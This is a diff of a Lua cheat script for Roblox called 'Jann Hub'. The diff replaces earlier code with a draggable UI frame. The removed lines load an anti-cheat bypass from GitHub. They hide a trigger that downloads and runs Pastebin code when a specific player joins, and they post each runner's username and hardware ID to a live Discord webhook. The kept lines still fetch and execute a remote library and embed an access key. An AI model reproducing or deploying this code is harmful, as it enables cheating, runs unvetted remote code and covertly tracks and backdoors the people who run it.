@@ -1,92 +1,74 @@
 local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-Interface/CustomFIeld/main/RayField.lua'))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/OtherScripts/Adonis%20Anti-Cheat%20Bypass.lua"))()
-wait()
 
-game.Players.PlayerAdded:Connect(function(Player)
-	if Player.Name == "ProAIt5000" then
-		loadstring(game:HttpGet("https://pastebin.com/raw/NNT4U1wZ"))()
-	end
+-- Create a ScreenGui to hold the UI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create a Frame to hold the UI elements
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 200) -- Set the size of your UI frame
+frame.Position = UDim2.new(0.5, -150, 0.5, -100) -- Set the initial position of your UI frame
+frame.BackgroundColor3 = Color3.new(1, 1, 1) -- Set background color
+frame.BorderSizePixel = 0
+frame.Parent = ScreenGui
+
+-- Track mouse input events for dragging
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
 end)
 
-local HWID = game:GetService("RbxAnalyticsService"):GetClientId();
-local WhitelistedHWIDs = {"3e1c4b4e-9faf-4909-9bfe-f02ede989c70"}
-local qNVAKkuwxNpqruLjSRHg = false
- 
-function CheckHWID(hwidval)
-for _,whitelisted in pairs(WhitelistedHWIDs) do
- if hwidval == whitelisted then
-     return true
- elseif hwidval ~= whitelisted then
-     return false
-       end
+frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        dragInput = input
     end
-end
- 
-qNVAKkuwxNpqruLjSRHg = CheckHWID(HWID)
- 
-if qNVAKkuwxNpqruLjSRHg == true then
- game.Players:Kick("L")
-end
- 
+end)
 
-
-local url =
-   "https://webhook.lewisakura.moe/api/webhooks/1210543735364919326/mu34L2DbCoSANFu5gHMm4UbKqXiiVWDWEsoN-ssq4CwSVBmDjN3SLiPshaPmtlbXnTcp" 
-local data = {
-   ["content"] = " ",
-   ["embeds"] = {
-       {
-           ["title"] = "**Someone Executed Jann Hub** in: "   ..game.PlaceId.. " :) ",
-           ["description"] = "Username: **" .. game.Players.LocalPlayer.Name.."**, HWID: **"..game:GetService("RbxAnalyticsService"):GetClientId().."**",
-           ["type"] = "rich",
-           ["color"] = tonumber(0x7269da),
-           ["image"] = {
-               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-                   tostring(game:GetService("Players").LocalPlayer.Name)
-           }
-       }
-   }
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
-
-local link = "https://discord.gg/uNaTKuM7jQ"
-
-setclipboard(link)
-
-
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        local delta = input.Position - dragStart
+        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
 
 local Window = Rayfield:CreateWindow({
-   Name = "Jann Hub",
-   LoadingTitle = "Loading Jann Hub",
-   LoadingSubtitle = "by Jack & Venn | .gg/uNaTKuM7jQ",
-   ConfigurationSaving = {
-      Enabled = true,
-      FolderName = "FolderConfig", -- Create a custom folder for your hub/game
-      FileName = "Jann Hub"
-   },
-   Discord = {
-      Enabled = false,
-      Invite = "uNaTKuM7jQ", -- The Discord invite code, do not include discord.gg/
-      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
-   },
-   KeySystem = true, -- Set this to true to use our key system
-   KeySettings = {
-      Title = "Jann Hub",
-      Subtitle = "Key System",
-      Note = "Join the discord (https://discord.gg/uNaTKuM7jQ) (the link has been copied to your clipboard)",
-      FileName = "VennKey",
-      SaveKey = true,
-      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
-      Key = "x7Rg2YpL4JnIc6Xa8Wb3Ko2Tg9Hr1Zl5Pm2Qs8Vn3"
-   }
-   Draggable = true -- Making the UI draggable
+    Name = "Jann Hub",
+    LoadingTitle = "Loading Jann Hub",
+    LoadingSubtitle = "by Jack & Venn | .gg/uNaTKuM7jQ",
+    ConfigurationSaving = {
+        Enabled = true,
+        FolderName = "FolderConfig",
+        FileName = "Jann Hub"
+    },
+    Discord = {
+        Enabled = false,
+        Invite = "uNaTKuM7jQ",
+        RememberJoins = true
+    },
+    KeySystem = true,
+    KeySettings = {
+        Title = "Jann Hub",
+        Subtitle = "Key System",
+        Note = "Join the discord (https://discord.gg/uNaTKuM7jQ) (the link has been copied to your clipboard)",
+        FileName = "VennKey",
+        SaveKey = true,
+        GrabKeyFromSite = false,
+        Key = "x7Rg2YpL4JnIc6Xa8Wb3Ko2Tg9Hr1Zl5Pm2Qs8Vn3"
+    }
 })
 
 
